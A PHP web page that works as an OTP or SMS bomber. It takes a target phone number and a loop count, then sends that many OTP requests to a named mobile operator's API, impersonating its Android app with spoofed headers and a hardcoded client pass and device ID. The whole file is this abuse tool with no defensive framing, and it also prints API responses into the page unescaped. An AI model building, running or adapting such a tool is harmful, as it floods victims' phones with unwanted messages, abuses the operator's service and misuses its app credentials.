<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send OTP</title>
    <style>
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        input[type="text"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        #response {
            margin-top: 20px;
        }

        #response h3 {
            margin-bottom: 10px;
        }

        #response ul {
            list-style-type: none;
            padding: 0;
        }

        #response li {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Send OTP</h2>
        <form id="otpForm" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" required>
            <label for="thread">Number of Threads:</label>
            <input type="text" id="thread" name="thread" required>
            <button type="submit">Send OTP</button>
        </form>
        <div id="response">
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                $threadCount = intval($_POST['thread']);
                if ($threadCount > 0) {
                    // Endpoint URL
                    $url = 'https://myblapi.banglalink.net/api/v1/send-otp';
                    
                    // Data to be sent in the request
                    $data = array(
                        'phone' => $_POST['phone'] // Get phone number from the form
                    );

                    // HTTP headers
                    $headers = array(
                        'Content-Type: application/x-www-form-urlencoded',
                        'User-Agent: okhttp/4.9.3',
                        'Cache-control: public, max-age=900, max-stale=900',
                        'Authorization:',
                        'platform: android',
                        'app-version: 11.3.1',
                        'version-code: 1103001',
                        'api-client-pass: 1E6F751EBCD16B4B719E76A34FBA9',
                        'msisdn:',
                        'connection-type:',
                        'customer-type: non-bl',
                        'uid: 8f44865c-c4b9-4962-ab29-9781e89cf90e'
                    );

                    // Output the response
                    echo "<h3>API Response:</h3>";
                    echo "<ul>";
                    for ($i = 0; $i < $threadCount; $i++) {
                        // Create a new cURL resource
                        $ch = curl_init();

                        // Set the cURL options
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

                        // Execute cURL request
                        $response = curl_exec($ch);

                        // Decode JSON response
                        $response_array = json_decode($response, true);

                        // Output the response in a formatted way
                        foreach ($response_array as $key => $value) {
                            echo "<li><strong>$key:</strong> $value</li>";
                        }
                    }
                    echo "</ul>";
                } else {
                    echo "<p>Please enter a valid number of threads.</p>";
                }
            }
            ?>
        </div>
    </div>
</body> 
</html>
